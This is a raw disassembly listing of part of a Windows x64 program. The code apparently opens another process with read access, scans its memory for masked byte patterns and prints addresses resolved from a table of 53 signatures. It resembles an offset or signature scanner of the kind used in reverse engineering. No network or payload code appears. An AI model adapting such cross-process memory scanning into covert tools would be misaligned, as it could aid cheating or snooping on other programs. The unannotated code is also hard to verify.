   140004805:	33 d2                	xor    %edx,%edx
   140004807:	48 8b c8             	mov    %rax,%rcx
   14000480a:	e8 41 4e 00 00       	call   0x140009650
   14000480f:	4c 89 b4 24 98 00 00 	mov    %r14,0x98(%rsp)
   140004816:	00 
   140004817:	ff 15 f3 57 00 00    	call   *0x57f3(%rip)        # 0x14000a010
   14000481d:	44 8b c0             	mov    %eax,%r8d
   140004820:	33 d2                	xor    %edx,%edx
   140004822:	b9 10 04 00 00       	mov    $0x410,%ecx
   140004827:	ff 15 eb 57 00 00    	call   *0x57eb(%rip)        # 0x14000a018
   14000482d:	48 8b f8             	mov    %rax,%rdi
   140004830:	48 85 c0             	test   %rax,%rax
   140004833:	74 38                	je     0x14000486d
   140004835:	48 8d 84 24 98 00 00 	lea    0x98(%rsp),%rax
   14000483c:	00 
   14000483d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004842:	4c 8b 0d bf d7 00 00 	mov    0xd7bf(%rip),%r9        # 0x140012008
   140004849:	4c 8b c6             	mov    %rsi,%r8
   14000484c:	48 8b 15 ad d7 00 00 	mov    0xd7ad(%rip),%rdx        # 0x140012000
   140004853:	48 8b cf             	mov    %rdi,%rcx
   140004856:	ff 15 c4 57 00 00    	call   *0x57c4(%rip)        # 0x14000a020
   14000485c:	48 8b cf             	mov    %rdi,%rcx
   14000485f:	85 c0                	test   %eax,%eax
   140004861:	0f 85 a2 00 00 00    	jne    0x140004909
   140004867:	ff 15 93 57 00 00    	call   *0x5793(%rip)        # 0x14000a000
   14000486d:	49 8b de             	mov    %r14,%rbx
   140004870:	48 85 f6             	test   %rsi,%rsi
   140004873:	74 34                	je     0x1400048a9
   140004875:	48 2b ee             	sub    %rsi,%rbp
   140004878:	48 81 fd 00 10 00 00 	cmp    $0x1000,%rbp
   14000487f:	72 1c                	jb     0x14000489d
   140004881:	48 83 c5 27          	add    $0x27,%rbp
   140004885:	48 8b 46 f8          	mov    -0x8(%rsi),%rax
   140004889:	48 2b f0             	sub    %rax,%rsi
   14000488c:	48 83 ee 08          	sub    $0x8,%rsi
   140004890:	48 83 fe 1f          	cmp    $0x1f,%rsi
   140004894:	0f 87 00 01 00 00    	ja     0x14000499a
   14000489a:	48 8b f0             	mov    %rax,%rsi
   14000489d:	48 8b d5             	mov    %rbp,%rdx
   1400048a0:	48 8b ce             	mov    %rsi,%rcx
   1400048a3:	e8 30 3f 00 00       	call   0x1400087d8
   1400048a8:	90                   	nop
   1400048a9:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   1400048ae:	e8 4d ef ff ff       	call   0x140003800
   1400048b3:	90                   	nop
   1400048b4:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400048b9:	48 85 c9             	test   %rcx,%rcx
   1400048bc:	0f 84 f3 00 00 00    	je     0x1400049b5
   1400048c2:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   1400048c7:	48 2b d1             	sub    %rcx,%rdx
   1400048ca:	48 8b c1             	mov    %rcx,%rax
   1400048cd:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400048d4:	0f 82 d6 00 00 00    	jb     0x1400049b0
   1400048da:	48 83 c2 27          	add    $0x27,%rdx
   1400048de:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400048e2:	48 2b c1             	sub    %rcx,%rax
   1400048e5:	48 83 e8 08          	sub    $0x8,%rax
   1400048e9:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400048ed:	0f 86 bd 00 00 00    	jbe    0x1400049b0
   1400048f3:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400048f8:	45 33 c9             	xor    %r9d,%r9d
   1400048fb:	45 33 c0             	xor    %r8d,%r8d
   1400048fe:	33 d2                	xor    %edx,%edx
   140004900:	33 c9                	xor    %ecx,%ecx
   140004902:	ff 15 60 5b 00 00    	call   *0x5b60(%rip)        # 0x14000a468
   140004908:	90                   	nop
   140004909:	ff 15 f1 56 00 00    	call   *0x56f1(%rip)        # 0x14000a000
   14000490f:	4d 8b ce             	mov    %r14,%r9
   140004912:	48 8b bc 24 98 00 00 	mov    0x98(%rsp),%rdi
   140004919:	00 
   14000491a:	48 2b fb             	sub    %rbx,%rdi
   14000491d:	0f 84 4a ff ff ff    	je     0x14000486d
   140004923:	4c 8b 54 24 30       	mov    0x30(%rsp),%r10
   140004928:	4c 8b 5c 24 48       	mov    0x48(%rsp),%r11
   14000492d:	0f 1f 00             	nopl   (%rax)
   140004930:	49 8b c6             	mov    %r14,%rax
   140004933:	48 85 db             	test   %rbx,%rbx
   140004936:	74 46                	je     0x14000497e
   140004938:	4c 8b c6             	mov    %rsi,%r8
   14000493b:	4d 2b c2             	sub    %r10,%r8
   14000493e:	4d 03 c1             	add    %r9,%r8
   140004941:	0f 1f 40 00          	nopl   0x0(%rax)
   140004945:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000494c:	00 00 00 00 
   140004950:	0f b6 c8             	movzbl %al,%ecx
   140004953:	80 e1 1f             	and    $0x1f,%cl
   140004956:	0f b6 d1             	movzbl %cl,%edx
   140004959:	48 8b c8             	mov    %rax,%rcx
   14000495c:	48 c1 e9 05          	shr    $0x5,%rcx
   140004960:	41 8b 0c 8b          	mov    (%r11,%rcx,4),%ecx
   140004964:	0f a3 d1             	bt     %edx,%ecx
   140004967:	73 0d                	jae    0x140004976
   140004969:	49 8d 14 02          	lea    (%r10,%rax,1),%rdx
   14000496d:	0f b6 0a             	movzbl (%rdx),%ecx
   140004970:	41 38 0c 10          	cmp    %cl,(%r8,%rdx,1)
   140004974:	75 17                	jne    0x14000498d
   140004976:	48 ff c0             	inc    %rax
   140004979:	48 3b c3             	cmp    %rbx,%rax
   14000497c:	72 d2                	jb     0x140004950
   14000497e:	48 8b 1d 7b d6 00 00 	mov    0xd67b(%rip),%rbx        # 0x140012000
   140004985:	49 03 d9             	add    %r9,%rbx
   140004988:	e9 e3 fe ff ff       	jmp    0x140004870
   14000498d:	49 ff c1             	inc    %r9
   140004990:	4c 3b cf             	cmp    %rdi,%r9
   140004993:	72 9b                	jb     0x140004930
   140004995:	e9 d3 fe ff ff       	jmp    0x14000486d
   14000499a:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   14000499f:	45 33 c9             	xor    %r9d,%r9d
   1400049a2:	45 33 c0             	xor    %r8d,%r8d
   1400049a5:	33 d2                	xor    %edx,%edx
   1400049a7:	33 c9                	xor    %ecx,%ecx
   1400049a9:	ff 15 b9 5a 00 00    	call   *0x5ab9(%rip)        # 0x14000a468
   1400049af:	90                   	nop
   1400049b0:	e8 23 3e 00 00       	call   0x1400087d8
   1400049b5:	48 8b c3             	mov    %rbx,%rax
   1400049b8:	eb 02                	jmp    0x1400049bc
   1400049ba:	33 c0                	xor    %eax,%eax
   1400049bc:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   1400049c1:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   1400049c5:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   1400049c9:	49 8b e3             	mov    %r11,%rsp
   1400049cc:	41 5e                	pop    %r14
   1400049ce:	5f                   	pop    %rdi
   1400049cf:	5e                   	pop    %rsi
   1400049d0:	c3                   	ret
   1400049d1:	e8 4a d3 ff ff       	call   0x140001d20
   1400049d6:	90                   	nop
   1400049d7:	cc                   	int3
   1400049d8:	cc                   	int3
   1400049d9:	cc                   	int3
   1400049da:	cc                   	int3
   1400049db:	cc                   	int3
   1400049dc:	cc                   	int3
   1400049dd:	cc                   	int3
   1400049de:	cc                   	int3
   1400049df:	cc                   	int3
   1400049e0:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1400049e5:	56                   	push   %rsi
   1400049e6:	41 54                	push   %r12
   1400049e8:	41 56                	push   %r14
   1400049ea:	48 83 ec 20          	sub    $0x20,%rsp
   1400049ee:	4c 8b ca             	mov    %rdx,%r9
   1400049f1:	48 8b ea             	mov    %rdx,%rbp
   1400049f4:	49 ba 67 66 66 66 66 	movabs $0x6666666666666667,%r10
   1400049fb:	66 66 66 
   1400049fe:	4c 8b f1             	mov    %rcx,%r14
   140004a01:	4d 8b e0             	mov    %r8,%r12
   140004a04:	49 8b c2             	mov    %r10,%rax
   140004a07:	4c 8b 01             	mov    (%rcx),%r8
   140004a0a:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140004a0e:	4d 2b c8             	sub    %r8,%r9
   140004a11:	49 f7 e9             	imul   %r9
   140004a14:	49 2b c8             	sub    %r8,%rcx
   140004a17:	49 b9 66 66 66 66 66 	movabs $0x666666666666666,%r9
   140004a1e:	66 66 06 
   140004a21:	48 8b f2             	mov    %rdx,%rsi
   140004a24:	48 c1 fe 04          	sar    $0x4,%rsi
   140004a28:	48 8b c6             	mov    %rsi,%rax
   140004a2b:	48 c1 e8 3f          	shr    $0x3f,%rax
   140004a2f:	48 03 f0             	add    %rax,%rsi
   140004a32:	49 8b c2             	mov    %r10,%rax
   140004a35:	48 f7 e9             	imul   %rcx
   140004a38:	48 c1 fa 04          	sar    $0x4,%rdx
   140004a3c:	48 8b c2             	mov    %rdx,%rax
   140004a3f:	48 c1 e8 3f          	shr    $0x3f,%rax
   140004a43:	48 03 d0             	add    %rax,%rdx
   140004a46:	49 3b d1             	cmp    %r9,%rdx
   140004a49:	0f 84 f2 00 00 00    	je     0x140004b41
   140004a4f:	49 8b 4e 10          	mov    0x10(%r14),%rcx
   140004a53:	49 8b c2             	mov    %r10,%rax
   140004a56:	49 2b c8             	sub    %r8,%rcx
   140004a59:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140004a5e:	4c 89 7c 24 50       	mov    %r15,0x50(%rsp)
   140004a63:	4c 8d 7a 01          	lea    0x1(%rdx),%r15
   140004a67:	48 f7 e9             	imul   %rcx
   140004a6a:	48 c1 fa 04          	sar    $0x4,%rdx
   140004a6e:	48 8b c2             	mov    %rdx,%rax
   140004a71:	48 c1 e8 3f          	shr    $0x3f,%rax
   140004a75:	48 03 d0             	add    %rax,%rdx
   140004a78:	49 8b c1             	mov    %r9,%rax
   140004a7b:	48 8b ca             	mov    %rdx,%rcx
   140004a7e:	48 d1 e9             	shr    $1,%rcx
   140004a81:	48 2b c1             	sub    %rcx,%rax
   140004a84:	48 3b d0             	cmp    %rax,%rdx
   140004a87:	76 53                	jbe    0x140004adc
   140004a89:	49 8b d9             	mov    %r9,%rbx
   140004a8c:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140004a90:	48 89 7c 24 48       	mov    %rdi,0x48(%rsp)
   140004a95:	48 c1 e1 03          	shl    $0x3,%rcx
   140004a99:	e8 22 c8 ff ff       	call   0x1400012c0
   140004a9e:	41 0f 10 04 24       	movups (%r12),%xmm0
   140004aa3:	48 8d 0c b6          	lea    (%rsi,%rsi,4),%rcx
   140004aa7:	48 8b f8             	mov    %rax,%rdi
   140004aaa:	0f 11 04 c8          	movups %xmm0,(%rax,%rcx,8)
   140004aae:	48 8d 34 c8          	lea    (%rax,%rcx,8),%rsi
   140004ab2:	48 8b c8             	mov    %rax,%rcx
   140004ab5:	41 0f 10 4c 24 10    	movups 0x10(%r12),%xmm1
   140004abb:	0f 11 4e 10          	movups %xmm1,0x10(%rsi)
   140004abf:	f2 41 0f 10 44 24 20 	movsd  0x20(%r12),%xmm0
   140004ac6:	f2 0f 11 46 20       	movsd  %xmm0,0x20(%rsi)
   140004acb:	4d 8b 46 08          	mov    0x8(%r14),%r8
   140004acf:	49 8b 16             	mov    (%r14),%rdx
   140004ad2:	49 3b e8             	cmp    %r8,%rbp
   140004ad5:	75 1a                	jne    0x140004af1
   140004ad7:	4c 2b c2             	sub    %rdx,%r8
   140004ada:	eb 2e                	jmp    0x140004b0a
   140004adc:	48 8d 04 11          	lea    (%rcx,%rdx,1),%rax
   140004ae0:	49 8b df             	mov    %r15,%rbx
   140004ae3:	49 3b c7             	cmp    %r15,%rax
   140004ae6:	48 0f 43 d8          	cmovae %rax,%rbx
   140004aea:	49 3b d9             	cmp    %r9,%rbx
   140004aed:	77 58                	ja     0x140004b47
   140004aef:	eb 9b                	jmp    0x140004a8c
   140004af1:	4c 8b c5             	mov    %rbp,%r8
   140004af4:	4c 2b c2             	sub    %rdx,%r8
   140004af7:	e8 4e 4b 00 00       	call   0x14000964a
   140004afc:	4d 8b 46 08          	mov    0x8(%r14),%r8
   140004b00:	48 8d 4e 28          	lea    0x28(%rsi),%rcx
   140004b04:	4c 2b c5             	sub    %rbp,%r8
   140004b07:	48 8b d5             	mov    %rbp,%rdx
   140004b0a:	e8 3b 4b 00 00       	call   0x14000964a
   140004b0f:	4c 8b cb             	mov    %rbx,%r9
   140004b12:	4d 8b c7             	mov    %r15,%r8
   140004b15:	48 8b d7             	mov    %rdi,%rdx
   140004b18:	49 8b ce             	mov    %r14,%rcx
   140004b1b:	e8 30 00 00 00       	call   0x140004b50
   140004b20:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140004b25:	48 8b c6             	mov    %rsi,%rax
   140004b28:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004b2d:	4c 8b 7c 24 50       	mov    0x50(%rsp),%r15
   140004b32:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140004b37:	48 83 c4 20          	add    $0x20,%rsp
   140004b3b:	41 5e                	pop    %r14
   140004b3d:	41 5c                	pop    %r12
   140004b3f:	5e                   	pop    %rsi
   140004b40:	c3                   	ret
   140004b41:	e8 da d1 ff ff       	call   0x140001d20
   140004b46:	cc                   	int3
   140004b47:	e8 14 d1 ff ff       	call   0x140001c60
   140004b4c:	cc                   	int3
   140004b4d:	cc                   	int3
   140004b4e:	cc                   	int3
   140004b4f:	cc                   	int3
   140004b50:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004b55:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004b5a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140004b5f:	41 56                	push   %r14
   140004b61:	48 83 ec 30          	sub    $0x30,%rsp
   140004b65:	48 8b d9             	mov    %rcx,%rbx
   140004b68:	49 8b f1             	mov    %r9,%rsi
   140004b6b:	48 8b 09             	mov    (%rcx),%rcx
   140004b6e:	4d 8b f0             	mov    %r8,%r14
   140004b71:	48 8b fa             	mov    %rdx,%rdi
   140004b74:	48 85 c9             	test   %rcx,%rcx
   140004b77:	74 50                	je     0x140004bc9
   140004b79:	4c 8b 53 10          	mov    0x10(%rbx),%r10
   140004b7d:	48 b8 67 66 66 66 66 	movabs $0x6666666666666667,%rax
   140004b84:	66 66 66 
   140004b87:	4c 2b d1             	sub    %rcx,%r10
   140004b8a:	49 f7 ea             	imul   %r10
   140004b8d:	48 c1 fa 04          	sar    $0x4,%rdx
   140004b91:	48 8b c2             	mov    %rdx,%rax
   140004b94:	48 c1 e8 3f          	shr    $0x3f,%rax
   140004b98:	48 03 d0             	add    %rax,%rdx
   140004b9b:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
   140004b9f:	48 c1 e2 03          	shl    $0x3,%rdx
   140004ba3:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004baa:	72 18                	jb     0x140004bc4
   140004bac:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140004bb0:	48 83 c2 27          	add    $0x27,%rdx
   140004bb4:	48 2b c8             	sub    %rax,%rcx
   140004bb7:	48 83 e9 08          	sub    $0x8,%rcx
   140004bbb:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140004bbf:	77 39                	ja     0x140004bfa
   140004bc1:	48 8b c8             	mov    %rax,%rcx
   140004bc4:	e8 0f 3c 00 00       	call   0x1400087d8
   140004bc9:	48 89 3b             	mov    %rdi,(%rbx)
   140004bcc:	4b 8d 04 b6          	lea    (%r14,%r14,4),%rax
   140004bd0:	48 8d 0c c7          	lea    (%rdi,%rax,8),%rcx
   140004bd4:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   140004bd8:	48 8d 04 b6          	lea    (%rsi,%rsi,4),%rax
   140004bdc:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140004be1:	48 8d 0c c7          	lea    (%rdi,%rax,8),%rcx
   140004be5:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140004bea:	48 89 4b 10          	mov    %rcx,0x10(%rbx)
   140004bee:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004bf3:	48 83 c4 30          	add    $0x30,%rsp
   140004bf7:	41 5e                	pop    %r14
   140004bf9:	c3                   	ret
   140004bfa:	45 33 c9             	xor    %r9d,%r9d
   140004bfd:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004c04:	00 00 
   140004c06:	45 33 c0             	xor    %r8d,%r8d
   140004c09:	33 d2                	xor    %edx,%edx
   140004c0b:	33 c9                	xor    %ecx,%ecx
   140004c0d:	ff 15 55 58 00 00    	call   *0x5855(%rip)        # 0x14000a468
   140004c13:	cc                   	int3
   140004c14:	cc                   	int3
   140004c15:	cc                   	int3
   140004c16:	cc                   	int3
   140004c17:	cc                   	int3
   140004c18:	cc                   	int3
   140004c19:	cc                   	int3
   140004c1a:	cc                   	int3
   140004c1b:	cc                   	int3
   140004c1c:	cc                   	int3
   140004c1d:	cc                   	int3
   140004c1e:	cc                   	int3
   140004c1f:	cc                   	int3
   140004c20:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004c25:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004c2a:	57                   	push   %rdi
   140004c2b:	48 83 ec 20          	sub    $0x20,%rsp
   140004c2f:	48 8b 1d 7a e3 00 00 	mov    0xe37a(%rip),%rbx        # 0x140012fb0
   140004c36:	48 8b f1             	mov    %rcx,%rsi
   140004c39:	48 8b 3d 78 e3 00 00 	mov    0xe378(%rip),%rdi        # 0x140012fb8
   140004c40:	48 3b df             	cmp    %rdi,%rbx
   140004c43:	74 21                	je     0x140004c66
   140004c45:	48 8b 0b             	mov    (%rbx),%rcx
   140004c48:	48 8b d6             	mov    %rsi,%rdx
   140004c4b:	e8 1e 4a 00 00       	call   0x14000966e
   140004c50:	85 c0                	test   %eax,%eax
   140004c52:	75 09                	jne    0x140004c5d
   140004c54:	48 8b 43 20          	mov    0x20(%rbx),%rax
   140004c58:	48 85 c0             	test   %rax,%rax
   140004c5b:	75 0b                	jne    0x140004c68
   140004c5d:	48 83 c3 28          	add    $0x28,%rbx
   140004c61:	48 3b df             	cmp    %rdi,%rbx
   140004c64:	75 df                	jne    0x140004c45
   140004c66:	33 c0                	xor    %eax,%eax
   140004c68:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004c6d:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004c72:	48 83 c4 20          	add    $0x20,%rsp
   140004c76:	5f                   	pop    %rdi
   140004c77:	c3                   	ret
   140004c78:	cc                   	int3
   140004c79:	cc                   	int3
   140004c7a:	cc                   	int3
   140004c7b:	cc                   	int3
   140004c7c:	cc                   	int3
   140004c7d:	cc                   	int3
   140004c7e:	cc                   	int3
   140004c7f:	cc                   	int3
   140004c80:	48 8d 05 29 e3 00 00 	lea    0xe329(%rip),%rax        # 0x140012fb0
   140004c87:	c3                   	ret
   140004c88:	cc                   	int3
   140004c89:	cc                   	int3
   140004c8a:	cc                   	int3
   140004c8b:	cc                   	int3
   140004c8c:	cc                   	int3
   140004c8d:	cc                   	int3
   140004c8e:	cc                   	int3
   140004c8f:	cc                   	int3
   140004c90:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004c95:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004c9a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004c9f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140004ca4:	41 56                	push   %r14
   140004ca6:	48 83 ec 70          	sub    $0x70,%rsp
   140004caa:	ba 35 00 00 00       	mov    $0x35,%edx
   140004caf:	48 8d 0d 7a 65 00 00 	lea    0x657a(%rip),%rcx        # 0x14000b230
   140004cb6:	e8 05 02 00 00       	call   0x140004ec0
   140004cbb:	4c 8b 0d f6 e2 00 00 	mov    0xe2f6(%rip),%r9        # 0x140012fb8
   140004cc2:	4c 8b 05 e7 e2 00 00 	mov    0xe2e7(%rip),%r8        # 0x140012fb0
   140004cc9:	4d 3b c1             	cmp    %r9,%r8
   140004ccc:	74 07                	je     0x140004cd5
   140004cce:	4c 89 05 e3 e2 00 00 	mov    %r8,0xe2e3(%rip)        # 0x140012fb8
   140004cd5:	48 8b 0d e4 e2 00 00 	mov    0xe2e4(%rip),%rcx        # 0x140012fc0
   140004cdc:	49 ba 67 66 66 66 66 	movabs $0x6666666666666667,%r10
   140004ce3:	66 66 66 
   140004ce6:	49 2b c8             	sub    %r8,%rcx
   140004ce9:	49 8b c2             	mov    %r10,%rax
   140004cec:	48 f7 e9             	imul   %rcx
   140004cef:	48 c1 fa 04          	sar    $0x4,%rdx
   140004cf3:	48 8b ca             	mov    %rdx,%rcx
   140004cf6:	48 c1 e9 3f          	shr    $0x3f,%rcx
   140004cfa:	48 03 d1             	add    %rcx,%rdx
   140004cfd:	48 83 fa 35          	cmp    $0x35,%rdx
   140004d01:	73 62                	jae    0x140004d65
   140004d03:	4d 3b c1             	cmp    %r9,%r8
   140004d06:	49 8b c8             	mov    %r8,%rcx
   140004d09:	49 8b c2             	mov    %r10,%rax
   140004d0c:	49 0f 44 c9          	cmove  %r9,%rcx
   140004d10:	49 2b c8             	sub    %r8,%rcx
   140004d13:	48 f7 e9             	imul   %rcx
   140004d16:	b9 48 08 00 00       	mov    $0x848,%ecx
   140004d1b:	48 8b fa             	mov    %rdx,%rdi
   140004d1e:	48 c1 ff 04          	sar    $0x4,%rdi
   140004d22:	48 8b c7             	mov    %rdi,%rax
   140004d25:	48 c1 e8 3f          	shr    $0x3f,%rax
   140004d29:	48 03 f8             	add    %rax,%rdi
   140004d2c:	e8 6b 3a 00 00       	call   0x14000879c
   140004d31:	4c 8b 05 80 e2 00 00 	mov    0xe280(%rip),%r8        # 0x140012fb8
   140004d38:	48 8b c8             	mov    %rax,%rcx
   140004d3b:	48 8b 15 6e e2 00 00 	mov    0xe26e(%rip),%rdx        # 0x140012fb0
   140004d42:	48 8b d8             	mov    %rax,%rbx
   140004d45:	4c 2b c2             	sub    %rdx,%r8
   140004d48:	e8 fd 48 00 00       	call   0x14000964a
   140004d4d:	41 b9 35 00 00 00    	mov    $0x35,%r9d
   140004d53:	48 8d 0d 56 e2 00 00 	lea    0xe256(%rip),%rcx        # 0x140012fb0
   140004d5a:	4c 8b c7             	mov    %rdi,%r8
   140004d5d:	48 8b d3             	mov    %rbx,%rdx
   140004d60:	e8 eb fd ff ff       	call   0x140004b50
   140004d65:	33 f6                	xor    %esi,%esi
   140004d67:	48 8d 3d c2 d2 00 00 	lea    0xd2c2(%rip),%rdi        # 0x140012030
   140004d6e:	bd 35 00 00 00       	mov    $0x35,%ebp
   140004d73:	41 be 2b 00 00 00    	mov    $0x2b,%r14d
   140004d79:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004d80:	0f 10 0f             	movups (%rdi),%xmm1
   140004d83:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140004d87:	33 db                	xor    %ebx,%ebx
   140004d89:	0f 10 47 10          	movups 0x10(%rdi),%xmm0
   140004d8d:	48 89 5c 24 60       	mov    %rbx,0x60(%rsp)
   140004d92:	0f 11 4c 24 30       	movups %xmm1,0x30(%rsp)
   140004d97:	0f 11 4c 24 40       	movups %xmm1,0x40(%rsp)
   140004d9c:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   140004da1:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140004da6:	e8 b5 f9 ff ff       	call   0x140004760
   140004dab:	48 85 c0             	test   %rax,%rax
   140004dae:	74 3b                	je     0x140004deb
   140004db0:	0f 10 4c 24 20       	movups 0x20(%rsp),%xmm1
   140004db5:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   140004db9:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   140004dbe:	66 0f 7e c1          	movd   %xmm0,%ecx
   140004dc2:	84 c9                	test   %cl,%cl
   140004dc4:	74 5b                	je     0x140004e21
   140004dc6:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   140004dca:	66 0f 7e ca          	movd   %xmm1,%edx
   140004dce:	66 0f 73 d8 04       	psrldq $0x4,%xmm0
   140004dd3:	48 8b c8             	mov    %rax,%rcx
   140004dd6:	66 41 0f 7e c0       	movd   %xmm0,%r8d
   140004ddb:	e8 00 f9 ff ff       	call   0x1400046e0
   140004de0:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140004de5:	48 8b d8             	mov    %rax,%rbx
   140004de8:	48 ff c6             	inc    %rsi
   140004deb:	48 8b 15 c6 e1 00 00 	mov    0xe1c6(%rip),%rdx        # 0x140012fb8
   140004df2:	48 3b 15 c7 e1 00 00 	cmp    0xe1c7(%rip),%rdx        # 0x140012fc0
   140004df9:	74 3b                	je     0x140004e36
   140004dfb:	0f 10 44 24 30       	movups 0x30(%rsp),%xmm0
   140004e00:	0f 11 02             	movups %xmm0,(%rdx)
   140004e03:	0f 10 44 24 20       	movups 0x20(%rsp),%xmm0
   140004e08:	0f 11 42 10          	movups %xmm0,0x10(%rdx)
   140004e0c:	f2 0f 10 44 24 60    	movsd  0x60(%rsp),%xmm0
   140004e12:	f2 0f 11 42 20       	movsd  %xmm0,0x20(%rdx)
   140004e17:	48 83 05 99 e1 00 00 	addq   $0x28,0xe199(%rip)        # 0x140012fb8
   140004e1e:	28 
   140004e1f:	eb 2b                	jmp    0x140004e4c
   140004e21:	66 0f 7e c9          	movd   %xmm1,%ecx
   140004e25:	85 c9                	test   %ecx,%ecx
   140004e27:	74 b7                	je     0x140004de0
   140004e29:	48 63 d9             	movslq %ecx,%rbx
   140004e2c:	48 03 d8             	add    %rax,%rbx
   140004e2f:	48 89 5c 24 60       	mov    %rbx,0x60(%rsp)
   140004e34:	eb b2                	jmp    0x140004de8
   140004e36:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140004e3b:	48 8d 0d 6e e1 00 00 	lea    0xe16e(%rip),%rcx        # 0x140012fb0
   140004e42:	e8 99 fb ff ff       	call   0x1400049e0
   140004e47:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140004e4c:	4c 8b 44 24 40       	mov    0x40(%rsp),%r8
   140004e51:	48 8d 0d 10 64 00 00 	lea    0x6410(%rip),%rcx        # 0x14000b268
   140004e58:	ba 2d 00 00 00       	mov    $0x2d,%edx
   140004e5d:	48 85 db             	test   %rbx,%rbx
   140004e60:	4c 8b cb             	mov    %rbx,%r9
   140004e63:	41 0f 45 d6          	cmovne %r14d,%edx
   140004e67:	e8 54 00 00 00       	call   0x140004ec0
   140004e6c:	48 83 c7 28          	add    $0x28,%rdi
   140004e70:	48 83 ed 01          	sub    $0x1,%rbp
   140004e74:	0f 85 06 ff ff ff    	jne    0x140004d80
   140004e7a:	4c 8b c6             	mov    %rsi,%r8
   140004e7d:	48 8d 0d fc 63 00 00 	lea    0x63fc(%rip),%rcx        # 0x14000b280
   140004e84:	ba 35 00 00 00       	mov    $0x35,%edx
   140004e89:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140004e8e:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140004e92:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   140004e96:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140004e9a:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   140004e9e:	49 8b e3             	mov    %r11,%rsp
   140004ea1:	41 5e                	pop    %r14
   140004ea3:	e9 18 00 00 00       	jmp    0x140004ec0
   140004ea8:	cc                   	int3
   140004ea9:	cc                   	int3
   140004eaa:	cc                   	int3
   140004eab:	cc                   	int3
   140004eac:	cc                   	int3
   140004ead:	cc                   	int3
   140004eae:	cc                   	int3
   140004eaf:	cc                   	int3
   140004eb0:	48 8d 05 f1 e0 00 00 	lea    0xe0f1(%rip),%rax        # 0x140012fa8
   140004eb7:	c3                   	ret
   140004eb8:	cc                   	int3
   140004eb9:	cc                   	int3
   140004eba:	cc                   	int3
   140004ebb:	cc                   	int3
   140004ebc:	cc                   	int3
   140004ebd:	cc                   	int3
   140004ebe:	cc                   	int3
   140004ebf:	cc                   	int3
   140004ec0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140004ec5:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004eca:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140004ecf:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004ed4:	53                   	push   %rbx
   140004ed5:	57                   	push   %rdi
   140004ed6:	48 83 ec 38          	sub    $0x38,%rsp
   140004eda:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004edf:	48 8d 7c 24 58       	lea    0x58(%rsp),%rdi
   140004ee4:	ff 15 f6 55 00 00    	call   *0x55f6(%rip)        # 0x14000a4e0
   140004eea:	48 8b d8             	mov    %rax,%rbx
   140004eed:	e8 be ff ff ff       	call   0x140004eb0
   140004ef2:	4c 8b 44 24 50       	mov    0x50(%rsp),%r8
   140004ef7:	45 33 c9             	xor    %r9d,%r9d
   140004efa:	48 8b d3             	mov    %rbx,%rdx
   140004efd:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140004f02:	48 8b 08             	mov    (%rax),%rcx
   140004f05:	ff 15 05 56 00 00    	call   *0x5605(%rip)        # 0x14000a510
   140004f0b:	48 83 c4 38          	add    $0x38,%rsp
   140004f0f:	5f                   	pop    %rdi
